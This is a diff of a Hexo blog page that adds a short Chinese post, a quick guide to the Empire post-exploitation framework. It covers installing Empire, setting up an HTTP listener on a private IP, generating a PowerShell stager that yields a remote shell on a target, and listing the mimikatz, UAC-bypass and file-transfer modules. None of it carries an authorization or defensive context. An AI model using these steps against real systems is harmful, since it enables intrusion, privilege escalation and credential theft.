@@ -7,7 +7,7 @@
     
 
     <title>
-      Archives 
+      Empire 速食指南 | Hexo 
     </title>
 
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -16,12 +16,16 @@
     
     
 
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Archives">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+    <meta name="description" content="0x00 installgit clone https://github.com/EmpireProject/Empire.git ./setup/install.sh 0x01 quick start安装完成之后./empire即可运行Empire建立一个监听: listeners uselistener http set Name Empire set Host http://192.168.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Empire 速食指南 | Hexo">
+<meta property="og:url" content="http://yoursite.com/2017/08/17/test/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 installgit clone https://github.com/EmpireProject/Empire.git ./setup/install.sh 0x01 quick start安装完成之后./empire即可运行Empire建立一个监听: listeners uselistener http set Name Empire set Host http://192.168.">
+<meta property="og:updated_time" content="2017-08-17T15:34:37.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Archives">
+<meta name="twitter:title" content="Empire 速食指南 | Hexo">
+<meta name="twitter:description" content="0x00 installgit clone https://github.com/EmpireProject/Empire.git ./setup/install.sh 0x01 quick start安装完成之后./empire即可运行Empire建立一个监听: listeners uselistener http set Name Empire set Host http://192.168.">
     
     
     
@@ -141,46 +145,69 @@ classes that you can use:
         <div class="content-wrapper__inner entry">
             
 
+<article class="post-container post-container--single">
 
-   <!-- do nothing -->
-
-
-<div class="main-post-list">
-    <ol class="post-list">
+  <header class="post-header">
     
-    
-    <li>
+    <h1 class="post-title">Empire 速食指南</h1>
 
-      <h2 class="post-list__post-title post-title">
-        <a href="/2017/08/17/test/" title="link to Empire 速食指南">Empire 速食指南</a>
-      </h2>
-
-      <div class="post-list__meta">
-
-        <time datetime="2017-08-17" class="post-list__meta--date date">2017-08-17</time> 
-      </div>
-
-      <div class="excerpt">
-        
-      </div>
-
-      <hr class="post-list__divider" />
-    </li>
-    
-  </ol>
-
-  <hr class="post-list__divider " />
-
-<nav class="pagination" role="navigation">
     
 
-    <span class="pagination__page-number"> 1 / 1</span>
+    <div class="post-meta">
+      <time datetime="2017-08-17" class="post-meta__date date">2017-08-17</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+
+      </span>
+    </div>
     
     
-</nav>
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h4 id="0x00-install"><a href="#0x00-install" class="headerlink" title="0x00 install"></a>0x00 install</h4><pre><code>git clone https://github.com/EmpireProject/Empire.git
+./setup/install.sh
+</code></pre><h4 id="0x01-quick-start"><a href="#0x01-quick-start" class="headerlink" title="0x01 quick start"></a>0x01 quick start</h4><p>安装完成之后<code>./empire</code>即可运行Empire<br>建立一个监听:</p>
+<pre><code>listeners
+uselistener http
+set Name Empire
+set Host http://192.168.2.131:1080
+execute
+</code></pre><p>再返回主菜单(main)生成stager:</p>
+<pre><code>usestager windows/dll
+set Listener Empire
+execute
+launcher powershell Empire
+</code></pre><p>将生成的powershell命令在目标机器上执行即可拿到一个shell,<code>agents</code>命令可查看上线主机,<code>interact NAME</code>可以获得一个交互的shell</p>
+<h4 id="0x02-常用模块"><a href="#0x02-常用模块" class="headerlink" title="0x02 常用模块"></a>0x02 常用模块</h4><p>你懂的</p>
+<pre><code>mimikatz
+bypassuac
+</code></pre><p>上传下载</p>
+<pre><code>download
+upload
+</code></pre><p>导入执行powershell:</p>
+<pre><code>scriptimport
+scriptcmd
+</code></pre><p>使用<code>searchmodule</code>可以查看模块的说明,模块比较多,就不一一说明了</p>
+<h3 id="0x03-后话"><a href="#0x03-后话" class="headerlink" title="0x03 后话"></a>0x03 后话</h3><p>我觉得我还是喜欢msf多一些</p>
+
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
 
 
-</div>
+</article>
+
+
             <footer class="footer">
 
     <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
@@ -208,6 +235,18 @@ classes that you can use:
 
 
     
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
     
     
     <!--kill ie6 -->
